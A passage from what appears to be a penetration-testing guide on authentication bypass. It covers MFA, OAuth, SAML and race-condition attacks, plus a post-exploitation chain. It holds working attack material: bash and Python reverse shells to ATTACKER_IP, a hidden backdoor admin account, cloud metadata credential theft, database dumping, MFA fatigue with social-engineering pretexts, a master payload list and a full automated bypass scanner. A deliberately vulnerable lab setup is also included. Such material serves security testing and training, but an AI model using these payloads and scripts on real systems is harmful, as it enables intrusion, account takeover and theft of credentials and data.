  POST /mfa/verify HTTP/1.1
  Content-Type: application/json

  {"otp": "previously_used_valid_otp"}
  ```

  ```http [OTP in Response / Headers]
  # Some applications leak OTP in:
  # - API response body
  # - Response headers
  # - Debug headers

  POST /api/login HTTP/1.1
  Content-Type: application/json

  {"username": "admin", "password": "correct"}

  # Check response for:
  # {"mfa_required": true, "otp_code": "123456"}  ← Leaked!
  # X-OTP-Code: 123456                            ← Leaked!
  # X-Debug-OTP: 123456                           ← Leaked!
  ```

  ```text [OTP in SMS API Response]
  # If app uses SMS API, intercept the API call
  # POST /api/sms/send
  # Response: {"status": "sent", "message": "Your code is 123456"}

  # Also check:
  # - JavaScript source code for OTP generation logic
  # - Network requests to /api/otp/generate
  # - Local storage / session storage in browser
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-arrow-left-right" label="Channel Switching"}

  ::code-group
  ```http [Switch from SMS to Email]
  # If SMS OTP is hard to intercept, try switching delivery channel
  POST /mfa/resend HTTP/1.1
  Content-Type: application/json

  {"method": "email"}
  {"delivery": "email"}
  {"channel": "email"}
  {"type": "backup_email"}
  ```

  ```http [Disable MFA via API]
  # Try to disable MFA through settings endpoint
  PUT /api/account/settings HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer partially_authenticated_token

  {
    "mfa_enabled": false,
    "two_factor": false,
    "otp_required": false
  }

  # Or via different API version
  PUT /api/v1/settings HTTP/1.1
  {"mfa": "disabled"}
  ```

  ```http [Backup Codes Brute-Force]
  # Backup codes are usually 8-digit alphanumeric
  # But some apps use simple formats

  POST /mfa/verify HTTP/1.1
  Content-Type: application/json

  {"backup_code": "12345678"}
  {"recovery_code": "ABCD-EFGH"}
  {"backup": "00000000"}
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-smartphone" label="MFA Fatigue / Push Spam"}
  
  For push-based MFA (like Microsoft Authenticator, Duo), repeatedly send push notifications until the user accepts.

  ```text [MFA Fatigue Attack]
  # Repeatedly trigger MFA push notifications
  # User gets annoyed and eventually approves to stop the spam

  # Trigger login attempt → push notification
  # Wait 30 seconds
  # Trigger another login attempt → push notification
  # Wait 30 seconds
  # Repeat until user approves

  # Most effective:
  # - During late hours (user half asleep)
  # - During busy work hours (user clicks approve by habit)
  # - Combined with social engineering ("IT is testing, please approve")
  ```
  :::
::

---

## OAuth / SSO Authentication Bypass

::tabs
  :::tabs-item{icon="i-lucide-external-link" label="OAuth Redirect Bypass"}

  ::code-group
  ```text [Open Redirect in redirect_uri]
  # Steal authorization code via redirect manipulation

  # Legitimate:
  GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback&response_type=code

  # Poisoned:
  GET /oauth/authorize?client_id=app&redirect_uri=https://attacker.com/steal&response_type=code

  # Bypass techniques for redirect_uri validation:
  redirect_uri=https://app.com.attacker.com/callback
  redirect_uri=https://app.com@attacker.com/callback
  redirect_uri=https://app.com%40attacker.com/callback
  redirect_uri=https://attacker.com/callback?legit=app.com
  redirect_uri=https://attacker.com%23@app.com/callback
  redirect_uri=https://app.com/callback/../../../attacker
  redirect_uri=https://app.com/callback%00.attacker.com
  redirect_uri=https://app.com/callback?next=https://attacker.com
  redirect_uri=https://App.com/callback   # Case variation
  redirect_uri=http://app.com/callback    # HTTP instead of HTTPS
  redirect_uri=https://app.com/callbackx  # Partial match
  ```

  ```http [Steal Token via Fragment]
  # If using implicit flow (response_type=token)
  # Token is in URL fragment — can be captured via open redirect

  GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/redirect?url=https://attacker.com&response_type=token

  # Victim is redirected to:
  # https://app.com/redirect?url=https://attacker.com#access_token=stolen_token
  # → https://attacker.com#access_token=stolen_token
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="State Parameter Attack"}

  ::code-group
  ```http [Missing State — CSRF Login Attack]
  # If state parameter is missing or not validated
  # Attacker can force victim to log into attacker's account

  # 1. Attacker initiates OAuth flow, gets authorization code
  # 2. Attacker doesn't use the callback URL
  # 3. Attacker sends callback URL to victim
  # 4. Victim clicks → logged into attacker's account

  GET /oauth/callback?code=attacker_auth_code HTTP/1.1
  # Victim is now logged in as attacker
  # Any data victim enters goes to attacker's account
  ```

  ```http [State Fixation]
  # Set a known state value
  GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback&state=FIXED_VALUE&response_type=code

  # If app doesn't validate state is tied to session:
  # Attacker uses the same FIXED_VALUE state in their session
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-replace" label="Token Exchange Flaws"}

  ::code-group
  ```http [Authorization Code Reuse]
  # Use the same authorization code multiple times
  POST /oauth/token HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  grant_type=authorization_code&code=REUSED_CODE&redirect_uri=https://app.com/callback&client_id=app&client_secret=secret
  ```

  ```http [Client Credential Theft]
  # If client_secret is exposed in:
  # - JavaScript source code
  # - Mobile app decompilation
  # - Public repositories
  # - API responses

  POST /oauth/token HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  grant_type=client_credentials&client_id=stolen_id&client_secret=stolen_secret
  ```

  ```http [Scope Escalation]
  # Request more scopes than authorized
  GET /oauth/authorize?client_id=app&scope=admin+read+write+delete+users:manage&response_type=code&redirect_uri=https://app.com/callback

  # Or add scopes during token exchange
  POST /oauth/token HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  grant_type=authorization_code&code=AUTH_CODE&scope=admin+openid+profile+email
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-file-code" label="SAML Bypass"}

  ::code-group
  ```xml [SAML Response Manipulation — Signature Removal]
  <!-- Remove the Signature element entirely -->
  <!-- If the SP doesn't require signatures, the assertion is accepted -->
  
  <samlp:Response>
    <!-- <ds:Signature> REMOVED </ds:Signature> -->
    <saml:Assertion>
      <saml:Subject>
        <saml:NameID>admin@target.com</saml:NameID>
      </saml:Subject>
      <saml:AttributeStatement>
        <saml:Attribute Name="role">
          <saml:AttributeValue>admin</saml:AttributeValue>
        </saml:Attribute>
      </saml:AttributeStatement>
    </saml:Assertion>
  </samlp:Response>
  ```

  ```xml [SAML — Comment Injection]
  <!-- Bypass NameID validation with XML comment -->
  <saml:NameID>
    admin@target.com<!---->.attacker.com
  </saml:NameID>
  
  <!-- Some parsers interpret this as admin@target.com -->
  <!-- While validation sees admin@target.com.attacker.com -->
  ```

  ```xml [SAML — Assertion Wrapping (XSW)]
  <!-- XML Signature Wrapping Attack -->
  <!-- Move signed assertion, add malicious unsigned assertion -->
  
  <samlp:Response>
    <saml:Assertion ID="_original_signed">
      <!-- Original signed assertion with legitimate user -->
      <saml:Subject>
        <saml:NameID>user@target.com</saml:NameID>
      </saml:Subject>
    </saml:Assertion>
    
    <saml:Assertion ID="_attacker_unsigned">
      <!-- Attacker's assertion — processed by SP -->
      <saml:Subject>
        <saml:NameID>admin@target.com</saml:NameID>
      </saml:Subject>
      <saml:AttributeStatement>
        <saml:Attribute Name="role">
          <saml:AttributeValue>super_admin</saml:AttributeValue>
        </saml:Attribute>
      </saml:AttributeStatement>
    </saml:Assertion>
  </samlp:Response>
  ```
  ::
  :::
::

---

## Race Condition Authentication Bypass

::code-group
```python [Registration Race — Duplicate Admin Account]
import requests
import threading

TARGET = "https://target.com/api/register"

def register_admin():
    resp = requests.post(TARGET, json={
        "username": "admin",
        "email": "admin@target.com",
        "password": "attacker_password"
    })
    if resp.status_code == 200:
        print(f"[!!!] Registration succeeded: {resp.text[:200]}")

# Fire 50 concurrent registration requests
# If the username uniqueness check and insert aren't atomic,
# one may succeed before the constraint is enforced
threads = [threading.Thread(target=register_admin) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

```python [Login Race — Session Fixation via Race]
import requests
import threading

TARGET = "https://target.com/api/login"
results = []

def race_login(idx):
    session = requests.Session()
    resp = session.post(TARGET, json={
        "username": "user_a",
        "password": "password_a"
    })
    cookies = session.cookies.get_dict()
    results.append({
        "thread": idx,
        "status": resp.status_code,
        "cookies": cookies,
        "body": resp.text[:200]
    })

# Race multiple logins
threads = [threading.Thread(target=race_login, args=(i,)) for i in range(30)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Check if any session was assigned to wrong user
for r in results:
    print(f"Thread {r['thread']}: {r['status']} — {r['cookies']}")
```

```python [Coupon/Token Race — Reuse Auth Token]
import requests
import threading

TARGET = "https://target.com/api/verify-email"
TOKEN = "one_time_verification_token_123"

def use_token():
    resp = requests.post(TARGET, json={
        "token": TOKEN,
        "email": "attacker@evil.com"
    })
    print(f"Status: {resp.status_code} — {resp.text[:100]}")

# If token invalidation isn't atomic with usage,
# multiple requests can use the same one-time token
threads = [threading.Thread(target=use_token) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```
::

---

## Privilege Escalation via Auth Bypass

::warning
Authentication bypass directly leads to privilege escalation — gaining access as any user means gaining their privileges. The impact is determined by **whose authentication** you bypass.
::

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Vertical PrivEsc"}
  
  **Vertical Privilege Escalation** — gaining admin access.

  ::steps{level="4"}

  #### Bypass admin authentication via SQLi

  ```http
  POST /admin/login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=admin'--&password=anything
  ```

  #### Access admin dashboard

  ```http
  GET /admin/dashboard HTTP/1.1
  Cookie: admin_session=received_session_cookie
  ```

  #### Extract sensitive data from admin panel

  ```http
  GET /admin/users/export?format=csv HTTP/1.1
  Cookie: admin_session=received_session_cookie
  ```

  #### Create persistent backdoor account

  ```http
  POST /admin/users/create HTTP/1.1
  Content-Type: application/json
  Cookie: admin_session=received_session_cookie

  {
    "username": "support_backup",
    "email": "support@legitimate-looking.com",
    "password": "Str0ngP@ss!",
    "role": "admin",
    "hidden": true
  }
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-layers" label="Full Attack Chain"}

  | Step | Technique | Result |
  |------|-----------|--------|
  | 1 | Default credentials on admin panel | Admin dashboard access |
  | 2 | JWT algorithm none attack | Forge admin token |
  | 3 | Admin panel file upload | Upload web shell |
  | 4 | Web shell → reverse shell | System access as `www-data` |
  | 5 | SUID binary / sudo misconfiguration | Root access |
  | 6 | Dump database credentials from config | Database access |
  | 7 | Pivot to internal network | Lateral movement |
  | 8 | Access secrets manager / vault | Cloud credentials |

  ::code-group
  ```bash [Step 4 — Reverse Shell]
  # From web shell, establish reverse connection
  bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

  # Or Python reverse shell
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
  ```

  ```bash [Step 5 — Linux PrivEsc]
  # Check sudo
  sudo -l

  # SUID binaries
  find / -perm -4000 -type f 2>/dev/null

  # Writable passwd
  ls -la /etc/passwd /etc/shadow

  # Kernel exploits
  uname -a && cat /etc/os-release

  # Credentials in config files
  find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null
  ```

  ```bash [Step 6 — Database Dump]
  # Find database credentials
  cat /var/www/html/.env
  cat /var/www/html/config/database.php
  cat /var/www/html/wp-config.php

  # Dump database
  mysqldump -u root -p'found_password' --all-databases > /tmp/full_dump.sql
  pg_dumpall -U postgres > /tmp/full_dump.sql
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-cloud" label="Cloud PrivEsc"}

  After bypassing authentication to a cloud-hosted application.

  ::code-group
  ```bash [AWS Metadata — Steal IAM Credentials]
  # From web shell on EC2 instance
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  # Returns role name, then:
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

  # Response contains:
  # AccessKeyId, SecretAccessKey, Token
  ```

  ```bash [AWS — Use Stolen Credentials]
  export AWS_ACCESS_KEY_ID="stolen_key"
  export AWS_SECRET_ACCESS_KEY="stolen_secret"
  export AWS_SESSION_TOKEN="stolen_token"

  # Enumerate access
  aws sts get-caller-identity
  aws s3 ls
  aws iam list-users
  aws ec2 describe-instances
  aws secretsmanager list-secrets
  ```

  ```bash [GCP — Metadata Server]
  curl -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  
  curl -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/project/project-id
  ```

  ```bash [Azure — IMDS]
  curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
  ```
  ::
  :::
::

---

## Comprehensive Bypass Payloads — Quick Reference

::code-collapse

```text [auth_bypass_payloads.txt]
# ============================================
# AUTHENTICATION BYPASS — MASTER PAYLOAD LIST
# For authorized penetration testing only
# ============================================

# === SQL INJECTION — LOGIN BYPASS ===
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
' OR 1=1 --
' OR 1=1 #
admin' --
admin' #
admin'/*
') OR ('1'='1
') OR ('1'='1' --
' OR 'x'='x
' OR ''='
' UNION SELECT 1,2,3 --
' UNION SELECT 'admin','password_hash' --
' OR 1=1 LIMIT 1 --
' OR 1=1 ORDER BY 1 --
admin'||'
admin' AND 1=1 --
' OR 1 LIKE 1 --
' OR 1 IN (1) --
' OR 'a' LIKE 'a
1' OR '1'='1
" OR "1"="1
" OR "1"="1" --
admin" --
" OR ""="
") OR ("1"="1
`OR 1=1 --

# === NoSQL INJECTION ===
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$in": ["admin"]}, "password": {"$ne": ""}}
username[$ne]=x&password[$ne]=x
username[$gt]=&password[$gt]=
username=admin&password[$regex]=.*

# === LDAP INJECTION ===
*
*)(&
*)(|(&
admin)(&)
admin)(|(password=*))
*))%00

# === DEFAULT CREDENTIALS ===
admin:admin
admin:password
admin:123456
admin:admin123
admin:
root:root
root:toor
root:
test:test
guest:guest
user:user
administrator:administrator

# === JWT BYPASS ===
# Algorithm none
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# Empty/null signature
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.

# Weak secrets to try
secret
password
123456
changeme
your-256-bit-secret

# === COOKIE TAMPERING ===
isLoggedIn=true
authenticated=1
admin=true
role=admin
user_type=administrator
access_level=9999

# === FORCED BROWSING ===
/admin
/admin/
/Admin
/ADMIN
//admin
/./admin
/admin..;/
/%2fadmin
/admin%00
/admin.json
/admin?x=1
/public/../admin

# === HTTP METHOD BYPASS ===
X-HTTP-Method-Override: PUT
X-HTTP-Method: DELETE
X-Method-Override: PATCH

# === IP-BASED TRUST BYPASS ===
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Original-URL: /admin
True-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1

# === MFA BYPASS ===
# Skip to dashboard after first factor
# Reuse previous OTP
# Send OTP as array: {"otp": ["000000","000001",...]}
# Null OTP: {"otp": null}
# Empty OTP: {"otp": ""}
# Disable MFA: {"mfa_enabled": false}

# === PARAMETER POLLUTION ===
username=admin&username=attacker
password=wrong&password=
role=user&role=admin

# === RESPONSE MANIPULATION ===
# Change: {"success":false} → {"success":true}
# Change: HTTP 401 → HTTP 200
# Change: {"authenticated":false} → {"authenticated":true}
# Change: Location: /login → Location: /dashboard
```

::

---

## Automated Scanner

::code-collapse

```python [auth_bypass_scanner.py]
#!/usr/bin/env python3
"""
Authentication Bypass Scanner
Automated testing of multiple bypass techniques
For authorized penetration testing only
"""

import requests
import json
import sys
import time
import base64
import re
from urllib.parse import urlparse, urljoin
from dataclasses import dataclass, asdict
from typing import List, Optional, Dict

@dataclass
class BypassResult:
    technique: str
    category: str
    endpoint: str
    payload: str
    status_code: int
    response_length: int
    success_indicators: List[str]
    likely_vulnerable: bool
    severity: str
    details: str = ""

class AuthBypassScanner:
    
    SUCCESS_INDICATORS = [
        'dashboard', 'welcome', 'logout', 'profile', 'account',
        'settings', 'admin', 'home', 'success', 'authenticated',
        'token', 'session', 'redirect'
    ]
    
    FAILURE_INDICATORS = [
        'invalid', 'incorrect', 'wrong', 'failed', 'error',
        'denied', 'unauthorized', 'forbidden', 'login', 'try again',
        'bad credentials', 'authentication failed'
    ]

    def __init__(self, target_url, login_endpoint="/login"):
        self.target = target_url.rstrip('/')
        self.login_endpoint = login_endpoint
        self.login_url = f"{self.target}{login_endpoint}"
        self.results: List[BypassResult] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.baseline_fail = None

    def get_baseline(self):
        """Establish baseline for failed login"""
        print("[*] Establishing baseline (failed login)...")
        try:
            resp = self.session.post(self.login_url, data={
                'username': 'definitely_invalid_user_xyz',
                'password': 'definitely_wrong_password_xyz'
            }, allow_redirects=False, timeout=10)
            
            self.baseline_fail = {
                'status': resp.status_code,
                'length': len(resp.text),
                'headers': dict(resp.headers),
                'body_hash': hash(resp.text)
            }
            print(f"    Baseline: HTTP {resp.status_code}, {len(resp.text)} bytes")
        except Exception as e:
            print(f"    [ERROR] {e}")

    def analyze_response(self, resp, technique, category, payload):
        """Analyze if bypass was successful"""
        body_lower = resp.text.lower()
        
        success_found = [i for i in self.SUCCESS_INDICATORS if i in body_lower]
        failure_found = [i for i in self.FAILURE_INDICATORS if i in body_lower]
        
        likely_vulnerable = False
        severity = "info"
        details = ""
        
        # Check various success conditions
        if resp.status_code in [200, 302] and success_found and not failure_found:
            likely_vulnerable = True
            severity = "critical"
            details = f"Success indicators found: {success_found}"
        elif resp.status_code == 302:
            location = resp.headers.get('Location', '')
            if any(s in location.lower() for s in ['dashboard', 'admin', 'home', 'account']):
                likely_vulnerable = True
                severity = "critical"
                details = f"Redirect to authenticated area: {location}"
        elif 'set-cookie' in str(resp.headers).lower():
            cookies = resp.headers.get('Set-Cookie', '')
            if 'session' in cookies.lower() or 'token' in cookies.lower():
                if self.baseline_fail and resp.status_code != self.baseline_fail['status']:
                    likely_vulnerable = True
                    severity = "high"
                    details = f"Session cookie set with different status than baseline"
        
        # Different response than baseline
        if self.baseline_fail:
            if (resp.status_code != self.baseline_fail['status'] or 
                abs(len(resp.text) - self.baseline_fail['length']) > 100):
                if not likely_vulnerable:
                    severity = "medium"
                    details += f" Different response than baseline (status: {resp.status_code} vs {self.baseline_fail['status']}, length diff: {abs(len(resp.text) - self.baseline_fail['length'])})"

        result = BypassResult(
            technique=technique,
            category=category,
            endpoint=self.login_url,
            payload=payload[:200],
            status_code=resp.status_code,
            response_length=len(resp.text),
            success_indicators=success_found,
            likely_vulnerable=likely_vulnerable,
            severity=severity,
            details=details
        )
        
        self.results.append(result)
        
        icon = "🔴" if likely_vulnerable else "🟡" if severity == "medium" else "🟢"
        print(f"  {icon} [{category}] {technique}: HTTP {resp.status_code} ({len(resp.text)} bytes) {details}")
        
        return result

    def test_sqli_bypass(self):
        """Test SQL injection authentication bypass"""
        print("\n[*] Testing SQL Injection bypass...")
        
        payloads = [
            ("' OR '1'='1", "anything"),
            ("' OR '1'='1' -- ", "anything"),
            ("' OR '1'='1' # ", "anything"),
            ("admin' -- ", "anything"),
            ("admin' # ", "anything"),
            ("') OR ('1'='1", "anything"),
            ("' OR 1=1 -- ", "anything"),
            ("' OR 1=1 LIMIT 1 -- ", "anything"),
            ("admin'/*", "anything"),
            ("' UNION SELECT 1,2,3 -- ", "anything"),
            ("\" OR \"1\"=\"1", "anything"),
            ("admin\" -- ", "anything"),
        ]
        
        for username, password in payloads:
            try:
                # Form data
                resp = self.session.post(self.login_url, data={
                    'username': username,
                    'password': password
                }, allow_redirects=False, timeout=10)
                
                self.analyze_response(resp, f"SQLi: {username[:50]}", "SQL Injection", username)
                
                # Also try JSON
                resp_json = self.session.post(self.login_url, json={
                    'username': username,
                    'password': password
                }, allow_redirects=False, timeout=10)
                
                self.analyze_response(resp_json, f"SQLi JSON: {username[:50]}", "SQL Injection", username)
                
                time.sleep(0.3)
            except Exception as e:
                print(f"  ⚠️  Error: {e}")

    def test_nosql_bypass(self):
        """Test NoSQL injection bypass"""
        print("\n[*] Testing NoSQL injection bypass...")
        
        payloads = [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": "admin", "password": {"$regex": ".*"}},
            {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}},
            {"username": {"$exists": True}, "password": {"$exists": True}},
        ]
        
        for payload in payloads:
            try:
                resp = self.session.post(self.login_url, json=payload, 
                    allow_redirects=False, timeout=10)
                self.analyze_response(resp, f"NoSQLi: {json.dumps(payload)[:60]}", 
                    "NoSQL Injection", json.dumps(payload))
                time.sleep(0.3)
            except Exception as e:
                print(f"  ⚠️  Error: {e}")
        
        # URL-parameter style
        url_payloads = [
            "username[$ne]=x&password[$ne]=x",
            "username[$gt]=&password[$gt]=",
            "username=admin&password[$regex]=.*",
        ]
        
        for payload in url_payloads:
            try:
                resp = self.session.post(self.login_url, data=payload,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    allow_redirects=False, timeout=10)
                self.analyze_response(resp, f"NoSQLi URL: {payload[:60]}", 
                    "NoSQL Injection", payload)
            except Exception as e:
                print(f"  ⚠️  Error: {e}")

    def test_default_credentials(self):
        """Test default credential combinations"""
        print("\n[*] Testing default credentials...")
        
        creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", "admin123"), ("admin", ""), ("root", "root"),
            ("root", "toor"), ("root", ""), ("test", "test"),
            ("guest", "guest"), ("user", "user"), ("demo", "demo"),
            ("administrator", "administrator"), ("admin", "Password1"),
            ("admin", "changeme"), ("admin", "secret"),
        ]
        
        for username, password in creds:
            try:
                resp = self.session.post(self.login_url, data={
                    'username': username,
                    'password': password
                }, allow_redirects=False, timeout=10)
                
                self.analyze_response(resp, f"Default: {username}:{password}", 
                    "Default Credentials", f"{username}:{password}")
                time.sleep(0.2)
            except Exception as e:
                print(f"  ⚠️  Error: {e}")

    def test_forced_browsing(self):
        """Test direct access to protected pages"""
        print("\n[*] Testing forced browsing...")
        
        paths = [
            '/admin', '/admin/', '/Admin', '/ADMIN', '//admin',
            '/admin/dashboard', '/dashboard', '/home',
            '/api/admin', '/api/users', '/api/config',
            '/admin.php', '/admin.html', '/admin.json',
            '/administrator', '/manage', '/management',
            '/portal', '/console', '/debug', '/internal',
            '/api/v1/users', '/api/v2/admin',
            '/graphql', '/.env', '/config',
        ]
        
        for path in paths:
            try:
                resp = self.session.get(f"{self.target}{path}", 
                    allow_redirects=False, timeout=10)
                
                if resp.status_code in [200, 301, 302]:
                    self.analyze_response(resp, f"Forced: {path}", 
                        "Forced Browsing", path)
                time.sleep(0.2)
            except Exception as e:
                pass

    def test_header_bypass(self):
        """Test IP-based trust and header bypass"""
        print("\n[*] Testing header-based bypass...")
        
        headers_to_test = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'X-Forwarded-For': '10.0.0.1'},
            {'X-Forwarded-For': '192.168.1.1'},
            {'X-Auth-Token': 'admin'},
            {'X-API-Key': 'admin'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin
        ]
        
        admin_paths = ['/admin', '/admin/dashboard', '/api/admin']
        
        for headers in headers_to_test:
            for path in admin_paths:
                try:
                    resp = self.session.get(f"{self.target}{path}",
                        headers=headers, allow_redirects=False, timeout=10)
                    
                    if resp.status_code in [200]:
                        header_name = list(headers.keys())[0]
                        self.analyze_response(resp, 
                            f"Header {header_name}: {path}", 
                            "Header Bypass", 
                            json.dumps(headers))
                except Exception as e:
                    pass

    def test_method_bypass(self):
        """Test HTTP method bypass"""
        print("\n[*] Testing HTTP method bypass...")
        
        methods = ['POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE']
        override_headers = [
            'X-HTTP-Method-Override', 'X-HTTP-Method', 'X-Method-Override'
        ]
        
        for method in methods:
            try:
                resp = self.session.request(method, f"{self.target}/admin",
                    allow_redirects=False, timeout=10)
                
                if resp.status_code in [200, 301, 302, 405]:
                    self.analyze_response(resp, f"Method: {method} /admin",
                        "Method Bypass", method)
            except Exception as e:
                pass
        
        for header in override_headers:
            try:
                resp = self.session.get(f"{self.target}/admin",
                    headers={header: 'POST'},
                    allow_redirects=False, timeout=10)
                
                if resp.status_code in [200]:
                    self.analyze_response(resp, f"Override: {header}",
                        "Method Bypass", header)
            except Exception as e:
                pass

    def test_parameter_tampering(self):
        """Test parameter-based bypass"""
        print("\n[*] Testing parameter tampering...")
        
        payloads = [
            {"username": "admin", "password": "admin", "role": "admin"},
            {"username": "admin", "password": "admin", "admin": "true"},
            {"username": "admin", "password": "admin", "authenticated": "1"},
            {"username": "admin", "password": "admin", "bypass": "true"},
            {"username": "admin", "password": "admin", "debug": "true"},
            {"username": "admin", "password": "admin", "internal": "true"},
            {"username": "admin", "password": "admin", "test_mode": "true"},
        ]
        
        for payload in payloads:
            try:
                resp = self.session.post(self.login_url, json=payload,
                    allow_redirects=False, timeout=10)
                
                extra = {k: v for k, v in payload.items() if k not in ['username', 'password']}
                self.analyze_response(resp, f"Param: {extra}",
                    "Parameter Tampering", json.dumps(extra))
                time.sleep(0.2)
            except Exception as e:
                print(f"  ⚠️  Error: {e}")

    def generate_report(self):
        """Generate scan report"""
        vulnerable = [r for r in self.results if r.likely_vulnerable]
        suspicious = [r for r in self.results if r.severity == "medium"]
        
        report = {
            "target": self.target,
            "login_endpoint": self.login_url,
            "total_tests": len(self.results),
            "critical_findings": len(vulnerable),
            "suspicious_findings": len(suspicious),
            "results": [asdict(r) for r in self.results]
        }
        
        filename = "auth_bypass_report.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{'='*70}")
        print(f" AUTHENTICATION BYPASS SCAN COMPLETE")
        print(f"{'='*70}")
        print(f" Target:              {self.target}")
        print(f" Total tests:         {len(self.results)}")
        print(f" Critical findings:   {len(vulnerable)}")
        print(f" Suspicious:          {len(suspicious)}")
        print(f" Report:              {filename}")
        
        if vulnerable:
            print(f"\n 🔴 CRITICAL — LIKELY VULNERABLE:")
            for v in vulnerable:
                print(f"    [{v.category}] {v.technique}")
                print(f"    {v.details}")
        
        if suspicious:
            print(f"\n 🟡 SUSPICIOUS — NEEDS MANUAL VERIFICATION:")
            for s in suspicious:
                print(f"    [{s.category}] {s.technique}")
                print(f"    {s.details}")
        
        print(f"{'='*70}")
        return report

    def run_all(self):
        """Execute all bypass tests"""
        print(f"{'='*70}")
        print(f" Authentication Bypass Scanner")
        print(f" Target: {self.target}")
        print(f" Login:  {self.login_url}")
        print(f"{'='*70}")
        
        self.get_baseline()
        self.test_sqli_bypass()
        self.test_nosql_bypass()
        self.test_default_credentials()
        self.test_forced_browsing()
        self.test_header_bypass()
        self.test_method_bypass()
        self.test_parameter_tampering()
        
        return self.generate_report()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [login_endpoint]")
        print(f"Example: {sys.argv[0]} https://target.com /login")
        sys.exit(1)
    
    endpoint = sys.argv[2] if len(sys.argv) > 2 else "/login"
    scanner = AuthBypassScanner(sys.argv[1], endpoint)
    scanner.run_all()
```

::

---

## Vulnerable Lab — Docker Compose

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # Vulnerable authentication application
  auth-lab:
    build:
      context: ./auth-lab
      dockerfile: Dockerfile
    ports:
      - "8080:3000"
    environment:
      - DB_HOST=mongo
      - DB_NAME=auth_lab
      - JWT_SECRET=weak_secret_123
      - ADMIN_PASSWORD=admin
      - NODE_ENV=development
    depends_on:
      - mongo
      - redis
    networks:
      - lab-net
    restart: unless-stopped

  # MongoDB — for NoSQL injection testing
  mongo:
    image: mongo:7
    ports:
      - "27017:27017"
    volumes:
      - mongo-data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init.js
    networks:
      - lab-net

  # Redis — for session testing
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    networks:
      - lab-net

  # MySQL — for SQL injection testing
  mysql-lab:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: sqli_lab
      MYSQL_USER: labuser
      MYSQL_PASSWORD: labpass
    ports:
      - "3306:3306"
    volumes:
      - mysql-data:/var/lib/mysql
      - ./init-mysql.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - lab-net

  # PHP app with SQL injection login
  sqli-lab:
    image: php:8.2-apache
    ports:
      - "8081:80"
    volumes:
      - ./sqli-app:/var/www/html
    depends_on:
      - mysql-lab
    networks:
      - lab-net

  # OAuth lab server
  oauth-lab:
    build:
      context: ./oauth-lab
      dockerfile: Dockerfile
    ports:
      - "8082:4000"
    environment:
      - CLIENT_SECRET=exposed_secret_in_source
    networks:
      - lab-net

  # Proxy for inspection
  mitmproxy:
    image: mitmproxy/mitmproxy:latest
    ports:
      - "9090:8080"
      - "9091:8081"
